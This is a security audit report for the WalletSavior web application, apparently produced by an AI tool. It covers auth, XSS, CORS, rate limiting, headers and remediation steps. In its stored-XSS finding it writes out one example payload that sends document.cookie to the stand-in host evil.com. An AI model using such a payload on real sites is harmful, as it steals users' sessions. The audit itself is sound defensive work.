# Website Sub-Project — Architecture-Level Security Audit

**Project:** WalletSavior / Website  
**Path:** `packages/website`  
**Date:** 2025-07-15  
**Auditor:** Copilot Security Planner  
**Stack:** FastAPI (Python) backend on port 8000 · React (Vite) frontend on port 5173  

---

## Executive Summary

The Website sub-project is the **only public-facing service** in WalletSavior, making it the primary attack surface. This audit identifies **4 Critical**, **6 High**, **8 Medium**, and **5 Low** severity findings across authentication, authorization, content security, inter-service trust, plugin sandboxing, and community features.

The most urgent issues are: unauthenticated crawler control endpoints, XSS via unsanitized HTML rendering, JWT tokens exposed in OAuth redirect URLs, and a hardcoded default JWT secret key.

| Severity | Count |
|----------|-------|
| 🔴 Critical | 4 |
| 🟠 High | 6 |
| 🟡 Medium | 8 |
| 🟢 Low | 5 |

---

## Findings

---

### CRITICAL-01 · Crawler Endpoints Exposed Without Authentication

| Field | Detail |
|-------|--------|
| **Severity** | 🔴 Critical |
| **Category** | Public Attack Surface / Authorization |
| **Files** | `backend/api/routes/crawlers.py` |
| **Current State** | `GET /api/crawlers` and `POST /api/crawlers/{name}/run` have **no auth guard** — any anonymous request can list and trigger crawlers. |
| **Threat** | An attacker can trigger arbitrary crawl jobs causing resource exhaustion, excessive outbound requests (which may get the server IP banned by scraped services), or data corruption in the database. |
| **Recommendation** | Add `Depends(require_admin)` to both crawler endpoints. Crawler management is an admin-only operation. |
| **Implementation Effort** | 🟢 Low — two-line change (add dependency injection) |

```python
# Before
@router.get("")
async def list_crawlers(): ...

# After
@router.get("", dependencies=[Depends(require_admin)])
async def list_crawlers(): ...
```

---

### CRITICAL-02 · Stored XSS via Unsanitized Rich-Text Rendering

| Field | Detail |
|-------|--------|
| **Severity** | 🔴 Critical |
| **Category** | Content Security / XSS |
| **Files** | `frontend/src/pages/Community/CommunityPage.jsx:773` |
| **Current State** | Community post bodies are rendered with `dangerouslySetInnerHTML={{ __html: post.body }}` **without any sanitization**. The TipTap editor constrains input during authoring, but raw HTML is stored in the DB and rendered verbatim. No `dompurify` or equivalent library is installed. |
| **Threat** | An attacker crafts a post containing `<img onerror="fetch('https://evil.com?c='+document.cookie)">` or `<script>` payloads. Any user viewing the post has their session tokens stolen (localStorage-based JWT), leading to full account takeover. |
| **Recommendation** | Install `dompurify` and sanitize all HTML before rendering. Also add server-side sanitization in the POST/PUT handlers as defense-in-depth. |
| **Implementation Effort** | 🟢 Low — install package, wrap one render call |

```jsx
// Frontend fix
import DOMPurify from 'dompurify';
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.body) }}
```

```python
# Backend defense-in-depth (install bleach)
import bleach
ALLOWED_TAGS = ['p', 'br', 'strong', 'em', 'a', 'ul', 'ol', 'li', 'img', 'h1', 'h2', 'h3', 'blockquote']
ALLOWED_ATTRS = {'a': ['href', 'title'], 'img': ['src', 'alt']}
content = bleach.clean(body.content, tags=ALLOWED_TAGS, attributes=ALLOWED_ATTRS)
```

---

### CRITICAL-03 · JWT Tokens Exposed in OAuth Redirect URL

| Field | Detail |
|-------|--------|
| **Severity** | 🔴 Critical |
| **Category** | Authentication Architecture |
| **Files** | `backend/services/oauth_service.py:105-107`, `backend/api/routes/auth.py` |
| **Current State** | After OAuth token exchange, the backend redirects with tokens in the URL query string: `RedirectResponse(url=f"http://localhost:5173/auth/callback?access_token={...}&refresh_token={...}")`. |
| **Threat** | Tokens appear in browser history, server access logs, proxy logs, Referer headers, and any analytics tools. An attacker with access to any of these sources obtains full user credentials. The refresh token (7-day validity) makes this especially dangerous. |
| **Recommendation** | Use a short-lived authorization code pattern: redirect with a one-time code, then have the frontend exchange it for tokens via a POST request. Alternatively, set tokens as `httpOnly` `Secure` `SameSite=Strict` cookies in the redirect response. |
| **Implementation Effort** | 🟡 Medium — requires frontend callback handler changes |

---

### CRITICAL-04 · Hardcoded Default JWT Secret Key

| Field | Detail |
|-------|--------|
| **Severity** | 🔴 Critical |
| **Category** | Authentication Architecture / Secret Management |
| **Files** | `backend/services/auth_service.py:8`, `backend/config.py` |
| **Current State** | `SECRET_KEY = os.getenv("JWT_SECRET_KEY", "dev-secret-key-change-in-production")`. If the `.env` file is missing or the variable is unset, the application runs with a publicly known secret. |
| **Threat** | Anyone who reads the source code can forge arbitrary JWT tokens, impersonating any user including admins. This is a complete authentication bypass. |
| **Recommendation** | Remove the default value. Fail loudly at startup if `JWT_SECRET_KEY` is not set. Use a cryptographically random key (≥256 bits). |
| **Implementation Effort** | 🟢 Low |

```python
SECRET_KEY = os.getenv("JWT_SECRET_KEY")
if not SECRET_KEY:
    raise RuntimeError("FATAL: JWT_SECRET_KEY environment variable is required")
```

---

### HIGH-01 · JWT Tokens Stored in localStorage (XSS Token Theft)

| Field | Detail |
|-------|--------|
| **Severity** | 🟠 High |
| **Category** | Authentication Architecture |
| **Files** | `frontend/src/services/api.js:68-80` |
| **Current State** | Access and refresh tokens are stored in `localStorage`. Any JavaScript executing in the page context (including XSS payloads from CRITICAL-02) can read `localStorage.getItem('access_token')`. |
| **Threat** | Combined with any XSS vulnerability, this allows silent exfiltration of all user tokens. The 7-day refresh token makes the window of exposure large. |
| **Recommendation** | Migrate to `httpOnly` `Secure` `SameSite=Strict` cookies for token storage. The backend should set cookies in login/refresh responses; the frontend should stop managing tokens in JS. Short-term: at minimum, ensure CRITICAL-02 is fixed to reduce XSS surface. |
| **Implementation Effort** | 🟡 Medium — requires coordinated backend + frontend changes |

---

### HIGH-02 · No Refresh Token Revocation or Blacklisting

| Field | Detail |
|-------|--------|
| **Severity** | 🟠 High |
| **Category** | Authentication Architecture |
| **Files** | `backend/api/routes/auth.py:59-67`, `backend/services/auth_service.py` |
| **Current State** | No logout endpoint exists. No token blacklist or revocation mechanism. The refresh endpoint accepts any valid (non-expired) refresh token and issues new tokens. Refresh tokens are valid for 7 days. |
| **Threat** | If a token is stolen, the attacker has 7 days of access with no way for the user or admin to revoke it. Password changes do not invalidate existing tokens. |
| **Recommendation** | Implement a token blacklist (Redis-backed for performance). Add a `/api/auth/logout` endpoint that blacklists the current refresh token. Include a `jti` (JWT ID) claim in refresh tokens for blacklist lookups. Invalidate all tokens on password change. |
| **Implementation Effort** | 🟡 Medium |

---

### HIGH-03 · Overly Permissive CORS Configuration

| Field | Detail |
|-------|--------|
| **Severity** | 🟠 High |
| **Category** | Public Attack Surface |
| **Files** | `backend/api/app.py:35-46` |
| **Current State** | CORS is configured with `allow_credentials=True`, `allow_methods=["*"]`, `allow_headers=["*"]`, and hardcoded localhost origins only. |
| **Threat** | `allow_methods=["*"]` permits TRACE (enables XST attacks) and other unexpected methods. `allow_headers=["*"]` with `allow_credentials=True` is an antipattern that weakens browser CORS protections. In production, if origins are not updated, the API will reject all frontend requests — or if set to `"*"`, will allow any origin to make credentialed requests. |
| **Recommendation** | Explicitly list allowed methods (`GET, POST, PUT, DELETE, OPTIONS`). Explicitly list allowed headers (`Authorization, Content-Type`). Make origins configurable via environment variable for production. |
| **Implementation Effort** | 🟢 Low |

```python
ALLOWED_ORIGINS = os.getenv("CORS_ORIGINS", "http://localhost:5173").split(",")
app.add_middleware(
    CORSMiddleware,
    allow_origins=ALLOWED_ORIGINS,
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE", "OPTIONS"],
    allow_headers=["Authorization", "Content-Type"],
)
```

---

### HIGH-04 · No Global Rate Limiting

| Field | Detail |
|-------|--------|
| **Severity** | 🟠 High |
| **Category** | Rate Limiting Architecture |
| **Files** | `backend/api/routes/hotdeals.py:23-39` (only rate-limited file) |
| **Current State** | Only 2 endpoints are rate-limited (`hotdeals/{id}/vote` and `hotdeals/{id}/report`) using an in-memory per-IP counter. All other endpoints — login, registration, search, scraping, community CRUD — have no rate limits. The in-memory store resets on restart and does not work across multiple workers. |
| **Threat** | Credential stuffing on `/api/auth/login`, search abuse causing excessive Playwright browser spawns (Naver scraping), comment/post spam flooding the community, and general API abuse/DDoS. |
| **Recommendation** | Add a global rate-limiting middleware using `slowapi` or a custom middleware backed by Redis. Apply tiered limits: stricter for auth endpoints (5/min), moderate for writes (30/min), lenient for reads (100/min). |
| **Implementation Effort** | 🟡 Medium |

```python
# Example with slowapi
from slowapi import Limiter
from slowapi.util import get_remote_address

limiter = Limiter(key_func=get_remote_address, storage_uri="redis://localhost:6379")

@router.post("/login")
@limiter.limit("5/minute")
async def login(request: Request, data: LoginRequest): ...
```

---

### HIGH-05 · OAuth Flow Missing CSRF State Parameter

| Field | Detail |
|-------|--------|
| **Severity** | 🟠 High |
| **Category** | Authentication Architecture |
| **Files** | `backend/services/oauth_service.py`, `backend/api/routes/auth.py` |
| **Current State** | The OAuth authorization URL is constructed without a `state` parameter. The callback endpoint does not validate any state value. |
| **Threat** | An attacker can perform a login CSRF attack: trick a victim into completing an OAuth flow that links the attacker's OAuth account to the victim's session, gaining future access. |
| **Recommendation** | Generate a cryptographically random `state` parameter, store it in a server-side session or signed cookie, include it in the authorization URL, and verify it in the callback. |
| **Implementation Effort** | 🟡 Medium |

---

### HIGH-06 · IP-Based Rate Limiting Vulnerable to Spoofing

| Field | Detail |
|-------|--------|
| **Severity** | 🟠 High |
| **Category** | Rate Limiting Architecture |
| **Files** | `backend/api/routes/hotdeals.py:113` |
| **Current State** | Rate limiting uses `request.client.host`, which behind a reverse proxy returns the proxy IP. Attackers can also spoof `X-Forwarded-For` headers if the app trusts them without validation. |
| **Threat** | Rate limit bypass — all users behind the same proxy/NAT share one limit, while attackers can forge different IPs. |
| **Recommendation** | Configure `ProxyHeadersMiddleware` from Uvicorn with a trusted proxy list. Use `X-Real-IP` from a trusted reverse proxy only. In production, pair with cloud-level rate limiting (e.g., Cloudflare, AWS WAF). |
| **Implementation Effort** | 🟢 Low |

---

### MEDIUM-01 · No Security Headers Middleware

| Field | Detail |
|-------|--------|
| **Severity** | 🟡 Medium |
| **Category** | Content Security Policy / Public Attack Surface |
| **Files** | `backend/api/app.py` (middleware section), `frontend/index.html` |
| **Current State** | No security headers are set by the backend or frontend. No CSP, HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, or Permissions-Policy headers are present. |
| **Threat** | Missing CSP enables XSS payload execution. Missing X-Frame-Options enables clickjacking. Missing HSTS allows SSL stripping. Missing X-Content-Type-Options allows MIME-type sniffing attacks. |
| **Recommendation** | Add a security headers middleware to FastAPI (see "Recommended Security Headers" section below). Also configure nginx in the production Dockerfile. |
| **Implementation Effort** | 🟢 Low |

---

### MEDIUM-02 · Plugin postMessage Origin Validation Disabled by Default

| Field | Detail |
|-------|--------|
| **Severity** | 🟡 Medium |
| **Category** | Iframe Sandbox Architecture |
| **Files** | `frontend/src/plugins/sdk/MessageBridge.js:40-44`, `frontend/src/plugins/sdk/PluginSDKLoader.js:76` |
| **Current State** | `MessageBridge.isOriginAllowed()` returns `true` for any origin when `_allowedOrigins` is empty (the default). `PluginSDKLoader` posts messages to `'*'` (any origin). The only validation is checking `data.source === 'wallet-savior'` — a string easily spoofed. |
| **Threat** | A malicious iframe or tab can send crafted postMessages to the application, potentially triggering plugin API actions (data read/write, UI manipulation). A malicious page embedding the app can intercept outgoing messages. |
| **Recommendation** | Always validate `event.origin` against a whitelist. Never post to `'*'` — use the specific plugin origin. Add a cryptographic nonce to the handshake protocol. |
| **Implementation Effort** | 🟡 Medium |

```javascript
// Fix: Always validate origin
isOriginAllowed(origin) {
    const TRUSTED_ORIGINS = [window.location.origin];
    return TRUSTED_ORIGINS.includes(origin);
}

// Fix: Never use '*' for target origin
window.parent.postMessage(message, window.location.origin);
```

---

### MEDIUM-03 · Guest Post Creation Without Moderation

| Field | Detail |
|-------|--------|
| **Severity** | 🟡 Medium |
| **Category** | Community Moderation |
| **Files** | `backend/api/routes/community.py:185-189` |
| **Current State** | Unauthenticated users can create posts as "게스트" (guest, user_id=0). Posts appear immediately with no moderation queue, no CAPTCHA, and no content filtering. |
| **Threat** | Automated spam, phishing links, malware distribution, SEO spam. Combined with the XSS vulnerability (CRITICAL-02), anonymous users can post stored XSS payloads. |
| **Recommendation** | Require authentication for post creation. If guest posts are a feature requirement, add a moderation queue (posts pending admin approval), CAPTCHA, and content filtering. At minimum, rate-limit guest post creation. |
| **Implementation Effort** | 🟡 Medium |

---

### MEDIUM-04 · Naver Scraping Query Not Sanitized or Encoded

| Field | Detail |
|-------|--------|
| **Severity** | 🟡 Medium |
| **Category** | Search/Scraping Security |
| **Files** | `backend/api/routes/naver_local.py:236, 384` |
| **Current State** | User-supplied search queries are concatenated directly into Naver search URLs without URL-encoding: `url = f"https://map.naver.com/p/search/{query}"`. The query also flows into Playwright browser navigation. |
| **Threat** | Special characters can break URL parsing. While this is server-side scraping (not reflected to user), malicious queries could potentially exploit Playwright (e.g., navigating to `javascript:` URIs if constructed differently) or trigger unexpected behavior in the scraping pipeline. The server runs a browser pool — resource exhaustion via crafted queries is also a concern. |
| **Recommendation** | URL-encode all user input. Validate query length (max 100 chars). Reject queries containing suspicious patterns. Rate-limit scraping endpoints. |
| **Implementation Effort** | 🟢 Low |

```python
from urllib.parse import quote
MAX_QUERY_LENGTH = 100

query = query.strip()[:MAX_QUERY_LENGTH]
url = f"https://map.naver.com/p/search/{quote(query)}"
```

---

### MEDIUM-05 · In-Memory User Store (No Persistent Auth)

| Field | Detail |
|-------|--------|
| **Severity** | 🟡 Medium |
| **Category** | Authentication Architecture |
| **Files** | `backend/api/routes/auth.py:16-18` |
| **Current State** | Registered users are stored in `_users_db: dict[str, dict] = {}` — a Python dict that exists only in process memory. All user accounts are lost on application restart. |
| **Threat** | Not a direct security vulnerability, but creates operational risk: password resets are impossible, audit trails are lost, and the lack of persistence may lead developers to skip security measures "since it's temporary." |
| **Recommendation** | Migrate user storage to the SQLite/PostgreSQL database via SQLAlchemy models. This also enables features like account lockout, login history, and audit logging. |
| **Implementation Effort** | 🟡 Medium |

---

### MEDIUM-06 · Insufficient Input Validation on Community Content

| Field | Detail |
|-------|--------|
| **Severity** | 🟡 Medium |
| **Category** | Content Security / Input Validation |
| **Files** | `backend/api/schemas/community.py:14-22` |
| **Current State** | The `PostCreate` Pydantic schema has no length validation on `title` or `content`, no URL format validation on `url`, no range validation on `price` (accepts negative values), and no size limit on the `images` list. |
| **Threat** | Denial of service via extremely large post bodies (megabytes of HTML). Negative prices corrupt data integrity. Unbounded image lists cause memory exhaustion. Unvalidated URLs can contain `javascript:` or `data:` schemes for XSS. |
| **Recommendation** | Add comprehensive field validators. |
| **Implementation Effort** | 🟢 Low |

```python
class PostCreate(BaseModel):
    title: str = Field(..., min_length=1, max_length=200)
    content: str = Field(..., min_length=1, max_length=50000)
    post_type: PostType
    category: Optional[str] = Field(None, max_length=50)
    price: Optional[float] = Field(None, ge=0, le=100_000_000)
    url: Optional[HttpUrl] = None
    images: Optional[list[HttpUrl]] = Field(None, max_length=10)
```

---

### MEDIUM-07 · No TLS Enforcement or HTTPS Redirect

| Field | Detail |
|-------|--------|
| **Severity** | 🟡 Medium |
| **Category** | HTTPS/TLS |
| **Files** | `backend/main.py:14-20`, `frontend/Dockerfile` |
| **Current State** | Uvicorn runs on plain HTTP (`host=0.0.0.0, port=8000`). The `reload=True` flag is set (development mode). The frontend production Dockerfile serves via `nginx:alpine` on port 80 — no TLS configuration. No nginx config file exists for security headers or TLS. |
| **Threat** | All traffic (including JWT tokens, passwords, personal data) is transmitted in plaintext. Man-in-the-middle attacks can intercept or modify any request. |
| **Recommendation** | In production: deploy behind a TLS-terminating reverse proxy (nginx, Caddy, or cloud load balancer). Set `reload=False`. Add HSTS header. Create an nginx configuration with TLS certificates (Let's Encrypt). |
| **Implementation Effort** | 🟡 Medium |

---

### MEDIUM-08 · Naver Maps iframe Without Sandbox Attribute

| Field | Detail |
|-------|--------|
| **Severity** | 🟡 Medium |
| **Category** | Iframe Sandbox Architecture |
| **Files** | `frontend/src/pages/Local/LocalPage.jsx:468-476` |
| **Current State** | The Naver Maps iframe has `allow="geolocation"` but no `sandbox` attribute. This gives the iframe full capabilities including script execution, form submission, top-navigation, and popups. |
| **Threat** | If Naver Maps is compromised (supply chain attack) or serves malicious ads, the iframe can navigate the top-level page, access the parent window (same-origin), or open popups. Geolocation data is shared with Naver. |
| **Recommendation** | Add sandbox restrictions. Since Naver Maps requires scripts and same-origin for its own functionality, use `sandbox="allow-scripts allow-same-origin allow-popups"` (minimum viable). Document the privacy implications of geolocation sharing. |
| **Implementation Effort** | 🟢 Low |

---

### LOW-01 · Default Database URL Contains Credentials

| Field | Detail |
|-------|--------|
| **Severity** | 🟢 Low |
| **Category** | Secret Management |
| **Files** | `backend/config.py` |
| **Current State** | `DATABASE_URL` defaults to `"postgresql://user:password@localhost:5432/wallet_guardian"`. If `.env` is not configured, the app attempts to connect with hardcoded credentials. |
| **Threat** | Low direct risk (connection would fail in most environments), but exposes credential patterns in source code and could succeed if a PostgreSQL server is running with default credentials. |
| **Recommendation** | Remove hardcoded credentials from default values. Require explicit configuration. |
| **Implementation Effort** | 🟢 Low |

---

### LOW-02 · Unused Dependencies Increase Attack Surface

| Field | Detail |
|-------|--------|
| **Severity** | 🟢 Low |
| **Category** | CDN/Static Asset Security |
| **Files** | `backend/requirements.txt` |
| **Current State** | `redis>=5.0.0` and `psycopg2-binary>=2.9.0` are installed but not used in any code path. Dependencies use `>=` version specifiers (unpinned). |
| **Threat** | Unused packages increase the attack surface without benefit. Unpinned versions may introduce breaking changes or vulnerabilities on reinstall. |
| **Recommendation** | Remove unused dependencies. Pin exact versions with `pip freeze` or use `pip-tools` for lockfile management. Run `pip audit` / `safety check` regularly. |
| **Implementation Effort** | 🟢 Low |

---

### LOW-03 · Image URLs Not Validated (data: URI Risk)

| Field | Detail |
|-------|--------|
| **Severity** | 🟢 Low |
| **Category** | Content Security |
| **Files** | `backend/api/routes/community.py:209-218` |
| **Current State** | Image URLs for posts are stored as raw strings without validation. The frontend also converts images to `data:` base64 URLs via `FileReader`. No URL scheme validation is performed. |
| **Threat** | Malicious `data:image/svg+xml;base64,...` URIs can contain embedded JavaScript that executes when rendered as `<img>` in SVG contexts. Large base64 strings waste database storage. |
| **Recommendation** | Validate image URLs against an allowed scheme list (`https://` only). If supporting uploads, store files on disk/S3 and reference by server-generated URL. Reject `data:` and `javascript:` schemes. |
| **Implementation Effort** | 🟢 Low |

---

### LOW-04 · No Error Boundary in React Frontend

| Field | Detail |
|-------|--------|
| **Severity** | 🟢 Low |
| **Category** | Error Handling |
| **Files** | `frontend/src/App.jsx` |
| **Current State** | No React Error Boundary component exists. Unhandled component errors crash the entire application, potentially exposing debug information in development builds. |
| **Threat** | Minimal direct security impact, but error crashes could leave the app in an inconsistent state, and development error overlays may leak internal paths or state. |
| **Recommendation** | Wrap the app in an Error Boundary that displays a generic error page and logs the error to a monitoring service. |
| **Implementation Effort** | 🟢 Low |

---

### LOW-05 · Docker Image Tags Not Pinned

| Field | Detail |
|-------|--------|
| **Severity** | 🟢 Low |
| **Category** | CDN/Static Asset Security |
| **Files** | `frontend/Dockerfile` |
| **Current State** | Uses `node:20-alpine` and `nginx:alpine` without specific version pins. |
| **Threat** | A compromised or buggy future tag update could introduce vulnerabilities into the build pipeline (supply chain attack). |
| **Recommendation** | Pin to specific digest or version: `node:20.11-alpine3.19`, `nginx:1.25-alpine3.19`. |
| **Implementation Effort** | 🟢 Low |

---

## Inter-Service Trust Analysis

### Current Architecture

```
┌──────────────┐    Direct Python import    ┌──────────────┐
│   Website    │ ──────────────────────────► │   DB Admin   │
│  (port 8000) │    sys.path manipulation    │  (port 8002) │
│              │    SQLite file access       │              │
└──────────────┘                            └──────────────┘
       │
       │  Stubs only (no real connection)
       ▼
┌──────────────┐
│Crawler Admin │
│  (port 8001) │
└──────────────┘
```

### Risks

| Risk | Impact | Likelihood |
|------|--------|------------|
| DB Admin module contains malicious code → Website executes it directly | 🔴 Critical | Low (internal team) |
| Shared SQLite file corrupted by concurrent access | 🟡 Medium | Medium |
| DB Admin path traversal via `sys.path.insert` | 🟡 Medium | Low |
| No authentication between services (all trust is implicit) | 🟠 High | Medium |

### Recommendations

1. **Short-term:** Replace direct Python imports with HTTP API calls to DB Admin (port 8002) with service-to-service JWT authentication.
2. **Medium-term:** Implement mutual TLS (mTLS) for inter-service communication.
3. **Long-term:** Use a service mesh (Istio/Linkerd) or API gateway for centralized auth, rate limiting, and observability between services.

---

## Recommended Security Headers

Add the following middleware to the FastAPI backend (`api/app.py`). In production, these should also be set in the nginx configuration.

### FastAPI Middleware Implementation

```python
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.requests import Request
from starlette.responses import Response

class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        response: Response = await call_next(request)
        response.headers["Content-Security-Policy"] = (
            "default-src 'self'; "
            "script-src 'self'; "
            "style-src 'self' 'unsafe-inline'; "
            "img-src 'self' data: https:; "
            "font-src 'self'; "
            "connect-src 'self' https://openapi.naver.com https://map.naver.com; "
            "frame-src https://map.naver.com; "
            "frame-ancestors 'none'; "
            "base-uri 'self'; "
            "form-action 'self'; "
            "object-src 'none';"
        )
        response.headers["Strict-Transport-Security"] = (
            "max-age=31536000; includeSubDomains; preload"
        )
        response.headers["X-Frame-Options"] = "DENY"
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["X-XSS-Protection"] = "0"  # Disabled; CSP is the modern replacement
        response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
        response.headers["Permissions-Policy"] = (
            "geolocation=(self), "
            "camera=(), "
            "microphone=(), "
            "payment=(), "
            "usb=()"
        )
        response.headers["Cross-Origin-Opener-Policy"] = "same-origin"
        response.headers["Cross-Origin-Resource-Policy"] = "same-origin"
        response.headers["Cross-Origin-Embedder-Policy"] = "credentialless"
        return response

# Register in app.py
app.add_middleware(SecurityHeadersMiddleware)
```

### Header Reference Table

| Header | Value | Purpose |
|--------|-------|---------|
| `Content-Security-Policy` | `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self' https://openapi.naver.com https://map.naver.com; frame-src https://map.naver.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self'; object-src 'none';` | Prevents XSS by restricting resource loading. Only allows scripts from same origin, images from HTTPS, iframes only from Naver Maps. |
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains; preload` | Forces HTTPS for 1 year. Prevents SSL stripping attacks. |
| `X-Frame-Options` | `DENY` | Prevents the site from being embedded in iframes (clickjacking protection). Redundant with CSP `frame-ancestors` but needed for older browsers. |
| `X-Content-Type-Options` | `nosniff` | Prevents browsers from MIME-sniffing responses away from declared `Content-Type`. Blocks attacks serving HTML as image/text. |
| `X-XSS-Protection` | `0` | Explicitly disabled. The legacy XSS auditor in older browsers can itself be exploited. CSP is the modern replacement. |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Sends full URL as referrer for same-origin, only origin for cross-origin, nothing for downgrade. Prevents token/path leaks in Referer header. |
| `Permissions-Policy` | `geolocation=(self), camera=(), microphone=(), payment=(), usb=()` | Restricts browser features. Only allows geolocation for the app itself (needed for Naver Maps). Disables camera, mic, payment, USB. |
| `Cross-Origin-Opener-Policy` | `same-origin` | Isolates the browsing context from cross-origin popups. Prevents Spectre-like side-channel attacks. |
| `Cross-Origin-Resource-Policy` | `same-origin` | Prevents other origins from loading this site's resources (images, scripts). |
| `Cross-Origin-Embedder-Policy` | `credentialless` | Ensures cross-origin resources load without credentials unless explicitly opted in. Enables `SharedArrayBuffer` safely. |

### Nginx Production Configuration

```nginx
server {
    listen 443 ssl http2;
    server_name yourdomain.com;

    ssl_certificate     /etc/letsencrypt/live/yourdomain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/yourdomain.com/privkey.pem;
    ssl_protocols       TLSv1.2 TLSv1.3;
    ssl_ciphers         ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
    ssl_prefer_server_ciphers on;

    # Security Headers
    add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self'; frame-src https://map.naver.com; frame-ancestors 'none'; object-src 'none';" always;
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
    add_header X-Frame-Options "DENY" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Permissions-Policy "geolocation=(self), camera=(), microphone=(), payment=()" always;
    add_header Cross-Origin-Opener-Policy "same-origin" always;

    # Serve frontend
    location / {
        root /usr/share/nginx/html;
        try_files $uri $uri/ /index.html;
    }

    # Proxy API to backend
    location /api/ {
        proxy_pass http://backend:8000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}

# HTTP → HTTPS redirect
server {
    listen 80;
    server_name yourdomain.com;
    return 301 https://$host$request_uri;
}
```

---

## User Data Privacy Assessment

### Data Collected

| Data Type | Storage Location | Retention | Encryption |
|-----------|-----------------|-----------|------------|
| Email address | In-memory dict (backend) | Until restart | None |
| Password hash (bcrypt) | In-memory dict (backend) | Until restart | Bcrypt hash |
| Nickname | In-memory dict (backend) | Until restart | None |
| OAuth tokens (Naver/Kakao/Google) | Transient (exchanged, not stored) | None | TLS in transit |
| Post content | SQLite database | Indefinite | None |
| IP addresses | Rate-limit memory store | Until restart | None |
| Geolocation (via browser) | Not stored server-side | Session only | None |
| Search queries | Not stored | None | None |

### Privacy Recommendations

1. **Privacy Policy:** Create and display a privacy policy page detailing what data is collected, how it's used, and user rights.
2. **Data Minimization:** Only collect data strictly necessary for functionality.
3. **Right to Deletion:** Implement account deletion endpoint that removes all user data (posts, comments, votes).
4. **Consent:** For geolocation, ensure explicit browser-level consent is obtained (already handled by browser API).
5. **Data Encryption:** Encrypt PII at rest if migrating to persistent database.
6. **Audit Logging:** Log data access events (who accessed what user data) for compliance.

---

## Remediation Priority Matrix

### Phase 1 — Immediate (Week 1)

| ID | Finding | Effort |
|----|---------|--------|
| CRITICAL-04 | Remove default JWT secret, fail on missing env var | 🟢 30 min |
| CRITICAL-01 | Add auth guards to crawler endpoints | 🟢 30 min |
| CRITICAL-02 | Install DOMPurify, sanitize HTML rendering | 🟢 1 hour |
| HIGH-03 | Fix CORS configuration (explicit methods/headers) | 🟢 30 min |
| MEDIUM-06 | Add Pydantic field validators for community schemas | 🟢 1 hour |
| MEDIUM-04 | URL-encode Naver scraping queries | 🟢 30 min |

### Phase 2 — Short-term (Weeks 2–3)

| ID | Finding | Effort |
|----|---------|--------|
| CRITICAL-03 | Redesign OAuth callback to avoid tokens in URL | 🟡 4 hours |
| HIGH-01 | Migrate token storage to httpOnly cookies | 🟡 8 hours |
| HIGH-02 | Implement token blacklist + logout endpoint | 🟡 4 hours |
| HIGH-04 | Add global rate limiting with slowapi + Redis | 🟡 4 hours |
| HIGH-05 | Add OAuth state parameter for CSRF protection | 🟡 2 hours |
| MEDIUM-01 | Add security headers middleware | 🟢 1 hour |

### Phase 3 — Medium-term (Weeks 4–6)

| ID | Finding | Effort |
|----|---------|--------|
| HIGH-06 | Configure trusted proxy headers | 🟢 1 hour |
| MEDIUM-02 | Fix plugin postMessage origin validation | 🟡 3 hours |
| MEDIUM-03 | Add moderation queue for guest/new-user posts | 🟡 8 hours |
| MEDIUM-05 | Migrate user store to persistent database | 🟡 8 hours |
| MEDIUM-07 | Configure TLS via nginx + Let's Encrypt | 🟡 4 hours |
| MEDIUM-08 | Add sandbox attribute to Naver Maps iframe | 🟢 30 min |

### Phase 4 — Ongoing

| Task | Frequency |
|------|-----------|
| Dependency audit (`pip audit`, `npm audit`) | Weekly |
| Pin dependency versions | Each update |
| Penetration testing | Quarterly |
| Security header validation (securityheaders.com) | Monthly |
| Log review for anomalies | Weekly |

---

*End of audit.*
